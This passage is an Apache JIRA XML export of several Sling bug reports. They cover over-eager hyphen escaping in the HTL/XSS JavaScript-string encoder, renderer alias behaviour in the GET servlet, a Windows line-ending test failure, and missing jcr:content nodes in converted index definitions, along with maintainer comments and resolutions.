                <link>https://issues.apache.org/jira/browse/SLING-11768</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;According to &lt;a href=&quot;https://github.com/adobe/htl-spec/blob/master/SPECIFICATION.md#121-display-context&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/adobe/htl-spec/blob/master/SPECIFICATION.md#121-display-context&lt;/a&gt; the context &lt;tt&gt;scriptString&lt;/tt&gt; should only encode&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;... characters that would break out of the string.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;But &lt;tt&gt;AAA-BBB&lt;/tt&gt; incorrectly becomes &lt;tt&gt;AAA\u002DBBB&lt;/tt&gt; through this context&lt;/p&gt;</description>
                <environment></environment>
        <key id="13523760">SLING-11768</key>
            <summary>Display Context &quot;scriptString&quot; encodes hyphen (-) as \u002D</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Wed, 8 Feb 2023 11:54:03 +0000</created>
                <updated>Wed, 22 Feb 2023 08:01:32 +0000</updated>
                                                                            <component>HTL</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17685874" author="kwin" created="Wed, 8 Feb 2023 11:56:30 +0000"  >&lt;p&gt;As internally only &lt;tt&gt;XSSApi.encodeForJSString()&lt;/tt&gt; is called in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-scripting-sightly/blob/d677bfad1c040aaa439fa3be2d4828d37da4d5f5/src/main/java/org/apache/sling/scripting/sightly/impl/engine/extension/XSSRuntimeExtension.java#L127&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-scripting-sightly/blob/d677bfad1c040aaa439fa3be2d4828d37da4d5f5/src/main/java/org/apache/sling/scripting/sightly/impl/engine/extension/XSSRuntimeExtension.java#L127&lt;/a&gt; this is probably an issue with the XSS library rather than with HTL.&lt;/p&gt;

&lt;p&gt;There is even an explicit test for that hyphen encoding at &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-xss/blob/3e1ae6c63fad9fd37ba2fafc4d2dab05bc24ed44/src/test/java/org/apache/sling/xss/impl/XSSAPIImplTest.java#L609&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-xss/blob/3e1ae6c63fad9fd37ba2fafc4d2dab05bc24ed44/src/test/java/org/apache/sling/xss/impl/XSSAPIImplTest.java#L609&lt;/a&gt; but I fail to see how one can leverage a hyphen to break out of a JS string context...&lt;/p&gt;</comment>
                            <comment id="17685877" author="kwin" created="Wed, 8 Feb 2023 12:08:28 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=radu&quot; class=&quot;user-hover&quot; rel=&quot;radu&quot;&gt;radu&lt;/a&gt; Would you mind commenting here? It seems this was deliberately introduced in &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-5946&quot; title=&quot;XSSAPI#encodeForJSString is not restrictive enough&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-5946&quot;&gt;&lt;del&gt;SLING-5946&lt;/del&gt;&lt;/a&gt; for JSON encoding but basically we now have &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11538&quot; title=&quot;Add display context for JSON string&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11538&quot;&gt;&lt;del&gt;SLING-11538&lt;/del&gt;&lt;/a&gt; for JSON strings, so I don&apos;t think we should escape hyphens in this context.&lt;/p&gt;</comment>
                            <comment id="17692004" author="radu.cotescu" created="Wed, 22 Feb 2023 08:01:09 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=kwin&quot; class=&quot;user-hover&quot; rel=&quot;kwin&quot;&gt;kwin&lt;/a&gt;, this seems to be the commit that encoded the dash like we see it now: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-xss/commit/bf2fb9bfb7aad00ece84456b3bd0a015d61788b9&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-xss/commit/bf2fb9bfb7aad00ece84456b3bd0a015d61788b9&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I have to agree with the observations from the commit and the subsequent comments from &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-5946&quot; title=&quot;XSSAPI#encodeForJSString is not restrictive enough&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-5946&quot;&gt;&lt;del&gt;SLING-5946&lt;/del&gt;&lt;/a&gt;/&lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-8879&quot; title=&quot;Make JSONObject#toString and XSSAPI#encodeForJSString both safe and correct for pasting into a javascript string literal&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-8879&quot;&gt;SLING-8879&lt;/a&gt;. This issue is therefore not in the HTL implementation, but in the XSS bundle.&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310660">
                    <name>Completes</name>
                                                                <inwardlinks description="is fixed by">
                                        <issuelink>
            <issuekey id="13272535">SLING-8879</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                            <outwardlinks description="relates to">
                                        <issuelink>
            <issuekey id="13476578">SLING-11538</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="12994605">SLING-5946</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 35 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1frq8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11767] Disabled XML renderer is still used when configured in extension alias</title>
                <link>https://issues.apache.org/jira/browse/SLING-11767</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;When configuring an extension alias (&quot;aliases&quot;) in the Sling Get servlet as&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
xml:pdf &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;that maps the pdf extension to the xml extension the content is rendered using the XML renderer, even when the XML renderer is disabled (via &quot;enable.xml&quot; = false).&lt;/p&gt;

&lt;p&gt;This can be reproduced via Sling 12 starter using&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
curl http:&lt;span class=&quot;code-comment&quot;&gt;//admin:admin@localhost:8080/content/starter.pdf&lt;/span&gt;&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13522965">SLING-11767</key>
            <summary>Disabled XML renderer is still used when configured in extension alias</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="10004">Not A Bug</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="bjoernweide">Bjoern Weide</reporter>
                        <labels>
                    </labels>
                <created>Fri, 3 Feb 2023 16:42:13 +0000</created>
                <updated>Tue, 16 May 2023 05:59:21 +0000</updated>
                            <resolved>Sat, 4 Feb 2023 08:55:52 +0000</resolved>
                                    <version>Servlets Get 2.1.44</version>
                                                    <component>Servlets</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>4</watches>
                                                                                                                <comments>
                            <comment id="17683991" author="kwin" created="Fri, 3 Feb 2023 18:41:25 +0000"  >&lt;p&gt;This was a deliberate decision introduced with &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-6790&quot; title=&quot;Enable aliases even if referenced format is disabled&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-6790&quot;&gt;&lt;del&gt;SLING-6790&lt;/del&gt;&lt;/a&gt; but I agree that this deserves a more explicit description in the alias.&lt;/p&gt;</comment>
                            <comment id="17683997" author="kwin" created="Fri, 3 Feb 2023 18:52:33 +0000"  >&lt;p&gt;I raised a PR where I clarified the effects of enabled/disabled renderers: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-servlets-get/pull/10&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-servlets-get/pull/10&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17684131" author="cziegeler" created="Sat, 4 Feb 2023 08:55:52 +0000"  >&lt;p&gt;as mentioned, this is by design&lt;/p&gt;</comment>
                            <comment id="17723001" author="kylegio" created="Tue, 16 May 2023 05:59:21 +0000"  >&lt;p&gt;There might be value in clarifying the descriptions used for the configuration:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;Enable XML
Whether the renderer for XML of the default GET servlet is enabled or not.&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I can see how someone might think that by unchecking this option that they have actually disabled the XML renderer - when all they have really done is disable the default extension -&amp;gt; renderer mapping.&#160;&lt;/p&gt;

&lt;p&gt;I think changing the wording would clear up the confusion and would be a non-breaking change.&#160;&lt;/p&gt;

&lt;p&gt;Other options to prevent any confusion would be to get rid of the checkboxes entirely and require the aliases to be configured even for the default mappings.&#160;&lt;br/&gt;
Or, each of the renderers could have a multifield of all the extensions that would be mapped to that renderer, and the renderer would only be created of the list length &amp;gt; 0.&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;kyle&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310050">
                    <name>Regression</name>
                                                                <inwardlinks description="is broken by">
                                        <issuelink>
            <issuekey id="13066611">SLING-6790</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 23 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1fmtk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11765] repoinit-filevault-validator: IT fails on Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11765</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;when trying to build repoinit-filevault-validator on windows, the IT fail with a very long stacktrace (&lt;span class=&quot;nobr&quot;&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/attachment/13054818/13054818_build.log&quot; title=&quot;build.log attached to SLING-11765&quot;&gt;build.log&lt;sup&gt;&lt;img class=&quot;rendericon&quot; src=&quot;https://issues.apache.org/jira/images/icons/link_attachment_7.gif&quot; height=&quot;7&quot; width=&quot;7&quot; align=&quot;absmiddle&quot; alt=&quot;&quot; border=&quot;0&quot;/&gt;&lt;/sup&gt;&lt;/a&gt;&lt;/span&gt; attached).&lt;br/&gt;
looks like EOF problems.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13521625">SLING-11765</key>
            <summary>repoinit-filevault-validator: IT fails on Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Thu, 26 Jan 2023 15:23:04 +0000</created>
                <updated>Tue, 31 Jan 2023 13:19:39 +0000</updated>
                            <resolved>Tue, 31 Jan 2023 13:19:02 +0000</resolved>
                                    <version>Repoinit FileVault Validator 1.0.0</version>
                                    <fixVersion>Repoinit FileVault Validator 1.0.2</fixVersion>
                                    <component>Repoinit</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17682139" author="kwin" created="Mon, 30 Jan 2023 15:16:44 +0000"  >&lt;p&gt;This is an issue with Groovy multiline strings always using &lt;tt&gt;\n&lt;/tt&gt; as line separators but the &lt;tt&gt;build.log&lt;/tt&gt; containing platform specific ones.&lt;/p&gt;</comment>
                            <comment id="17682567" author="kwin" created="Tue, 31 Jan 2023 13:19:11 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-repoinit-filevault-validator/commit/b678796286b1f3ecfc14b3673049c37a43cd0aae&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-repoinit-filevault-validator/commit/b678796286b1f3ecfc14b3673049c37a43cd0aae&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                            <attachment id="13054818" name="build.log" size="404881" author="sseifert" created="Thu, 26 Jan 2023 15:23:11 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>1.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 38 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1fenk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11764] jcr:content node missing for file resources generated in binaries index defintions</title>
                <link>https://issues.apache.org/jira/browse/SLING-11764</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The index definition files generated by the cpcconvertor are missing mandatory jcr:content nodes.&lt;/p&gt;

&lt;p&gt;How the resource should look:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
    &lt;span class=&quot;code-quote&quot;&gt;&quot;tika&quot;&lt;/span&gt;: {
      &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:primaryType&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;nam:nt:unstructured&quot;&lt;/span&gt;,
      &lt;span class=&quot;code-quote&quot;&gt;&quot;config.xml&quot;&lt;/span&gt;: {
        &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:primaryType&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;nam:nt:file&quot;&lt;/span&gt;,
        &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:content&quot;&lt;/span&gt;: {
          &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:mimeType&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;text/xml&quot;&lt;/span&gt;,
          &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:data&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;:blobId:&amp;lt;binary_data&amp;gt;&quot;&lt;/span&gt;,
          &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:primaryType&quot;&lt;/span&gt;: &lt;span class=&quot;code-quote&quot;&gt;&quot;nam:nt:resource&quot;&lt;/span&gt;
        }
      }
    }
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;How it looks like now:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
      &lt;span class=&quot;code-quote&quot;&gt;&quot;tika&quot;&lt;/span&gt;:{
         &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:primaryType&quot;&lt;/span&gt;:&lt;span class=&quot;code-quote&quot;&gt;&quot;nam:nt:unstructured&quot;&lt;/span&gt;,
         &lt;span class=&quot;code-quote&quot;&gt;&quot;config.xml&quot;&lt;/span&gt;:{
            &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:primaryType&quot;&lt;/span&gt;:&lt;span class=&quot;code-quote&quot;&gt;&quot;nam:nt:file&quot;&lt;/span&gt;,
          &lt;span class=&quot;code-quote&quot;&gt;&quot;jcr:data&quot;&lt;/span&gt;:&lt;span class=&quot;code-quote&quot;&gt;&quot;:blobid:&amp;lt;binary_data&amp;gt;&quot;&lt;/span&gt;
         }
      }&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;there is no jcr:content node present&lt;/p&gt;</description>
                <environment></environment>
        <key id="13521618">SLING-11764</key>
            <summary>jcr:content node missing for file resources generated in binaries index defintions</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="abhigarg">Abhishek Garg</assignee>
                                    <reporter username="abhigarg">Abhishek Garg</reporter>
                        <labels>
                    </labels>
                <created>Thu, 26 Jan 2023 13:53:25 +0000</created>
                <updated>Mon, 13 Feb 2023 08:49:03 +0000</updated>
                            <resolved>Thu, 2 Feb 2023 09:35:57 +0000</resolved>
                                    <version>Content-Package to Feature Model Converter 1.3.0</version>
                                    <fixVersion>Content-Package to Feature Model Converter 1.3.0</fixVersion>
                                    <component>Content-Package to Feature Model Converter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17682983" author="abhigarg" created="Wed, 1 Feb 2023 11:39:43 +0000"  >&lt;p&gt;PR:&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/154&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/154&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17683012" author="rombert" created="Wed, 1 Feb 2023 12:52:02 +0000"  >&lt;p&gt;PR &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/154&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/154&lt;/a&gt; applied, thanks a lot &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=abhigarg&quot; class=&quot;user-hover&quot; rel=&quot;abhigarg&quot;&gt;abhigarg&lt;/a&gt; for the contribution.&lt;/p&gt;</comment>
                            <comment id="17683082" author="abhigarg" created="Wed, 1 Feb 2023 16:32:23 +0000"  >&lt;p&gt;jcr:primaryType is still missing from index definitions.&lt;/p&gt;</comment>
                            <comment id="17683089" author="abhigarg" created="Wed, 1 Feb 2023 16:41:30 +0000"  >&lt;p&gt;PR: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/155&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-feature-cpconverter/pull/155&lt;/a&gt;&lt;br/&gt;
cc : &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt;&#160;&lt;/p&gt;</comment>
                            <comment id="17683310" author="rombert" created="Thu, 2 Feb 2023 09:35:57 +0000"  >&lt;p&gt;Thanks for the follow-up &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=abhigarg&quot; class=&quot;user-hover&quot; rel=&quot;abhigarg&quot;&gt;abhigarg&lt;/a&gt;, I&apos;ve merged the second PR as well.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 38 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1fem0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11763]  Not all &apos;style&apos; properties are preserved in the HTML output.</title>
                <link>https://issues.apache.org/jira/browse/SLING-11763</link>
                <project id="12310710" key="SLING">Sling</project>
